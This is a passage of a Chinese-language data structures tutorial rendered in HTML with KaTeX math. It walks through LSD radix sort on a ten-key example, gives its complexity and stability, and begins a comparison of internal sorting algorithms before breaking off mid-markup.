<p>下面描述以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 为基数的最低位优先基数排序的过程，在排序过程中，使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个队列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>Q</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>Q</mi><mrow><mi>r</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">Q_{0}, Q_{1}, \dotsc, Q_{r-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>。基数排序的过程如下：</p>
<p>对 <code>i = 0, 1, ..., d - 1</code>，依次做一次 “分配” 和 “收集”（其实是一次稳定的排序过程）。</p>
<ul>
<li><strong>分配</strong>：开始时，把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>Q</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>Q</mi><mrow><mi>r</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">Q_{0}, Q_{1}, \dotsc, Q_{r-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 各个队列置成空队列，然后依次考察线性表中的每个结点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><mo stretchy="false">(</mo><mi>j</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{j} (j = 0, 1, \dotsc, n - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">a_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的关键字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mi>j</mi><mi>i</mi></msubsup><mo>=</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">k_{j}^{i} = k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2194em;vertical-align:-0.3948em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-2.4413em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，就把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">a_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 放进 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">Q_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 队列中</li>
<li><strong>收集</strong>：把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>Q</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>Q</mi><mrow><mi>r</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">Q_{0}, Q_{1}, \dotsc, Q_{r-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 各个队列中的结点依次首尾相接，得到新的结点序列，从而组成新的线性表</li>
</ul>
<p>通常采用链式基数排序，假设对如下 <code>10</code> 个记录进行排序：<code>278 -&gt; 109 -&gt; 063 -&gt; 930 -&gt; 589 -&gt; 184 -&gt; 505 -&gt; 269 -&gt; 008 -&gt; 083</code></p>
<p>每个关键字是 <code>1000</code> 以下的正整数，基数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">r = 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>，在排序过程中需要借助 <code>10</code> 个链队列，每个关键字由 <code>3</code> 位子关键字构成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mn>1</mn></msup><msup><mi>K</mi><mn>2</mn></msup><msup><mi>K</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">K^{1}K^{2}K^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span>，分别代表百位、十位和个位，一共需要进行三趟 “分配” 和 “收集” 操作。</p>
<p>第一趟分配用最低位子关键字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">K^{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span> 进行，将所有最低位子关键字（个位）相等的记录分配到同一个队列，然后进行收集操作，第一趟收集后的结果如：<code>930 -&gt; 063 -&gt; 083 -&gt; 184 -&gt; 505 -&gt; 278 -&gt; 008 -&gt; 109 -&gt; 589 -&gt; 269</code>。</p>
<p>第二趟分配用次低位子关键字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">K^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 进行，将所有次低位子关键字（十位）相等的记录分配到同一个队列，第二趟收集后的结果如：<code>505 -&gt; 008 -&gt; 109 -&gt; 930 -&gt; 063 -&gt; 269 -&gt; 278 -&gt; 083 -&gt; 184 -&gt; 589</code>。</p>
<p>第三趟分配用最高位子关键字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">K^{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 进行，将所有最高位子关键字（百位）相等的记录分配到同一个队列，第三趟收集后的结果如：<code>008 -&gt; 063 -&gt; 083 -&gt; 109 -&gt; 184 -&gt; 269 -&gt; 278 -&gt; 505 -&gt; 589 -&gt; 930</code>，至此整个排序结束。</p>
<p>基数排序算法的 <strong>性能分析如下：</strong></p>
<ul>
<li><strong>空间效率</strong>：一趟排序需要的辅助存储空间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个队列：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个队头指针和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> 个队尾指针），但以后的排序中会重复使用这些队列，所以基数排序的空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span></li>
<li><strong>时间效率</strong>：基数排序需要进行 <code>d</code> 趟分配和收集，一趟分配需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，一趟收集需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(r)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span>，所以基数排序的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>r</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(d(n + r))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">))</span></span></span></span>，它与序列的初始状态无关</li>
<li><strong>稳定性</strong>：对于基数排序算法而言，很重要一点就是按位排序时必须是稳定的。因此，这也保证了基数排序的稳定性</li>
</ul>
<h3> 各种内部排序算法的比较及应用</h3>
<h4> 内部排序算法的比较</h4>
<p>排序算法的比较一般基于 <strong>三个因素</strong> 进行对比：时空复杂度、算法的稳定性、算法的过程特征。</p>
<ol>
<li>
<p><strong>从时间复杂度看</strong></p>
<p>简单选择排序、直接插入排序和冒泡排序平均情况下的时间复杂度都为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，且实现过程也较为简单，但直接插入排序和冒泡排序最好情况下的时间复杂度可以达到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，而简单选择排序则与序列的初始状态无关。</p>
<p>希尔排序作为插入排序的拓展，对较大规模的数据都可以达到很高的效率，但目前未得出其精确的渐近时间。</p>
<p>堆排序利用了一种称为堆的数据结构，可以在线性时间内完成建堆，且在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 内完成排序过程。</p>
<p>快速排序基于分治的思想，虽然最坏情况下的时间复杂度会达到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，但快速排序的平均性能可以达到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 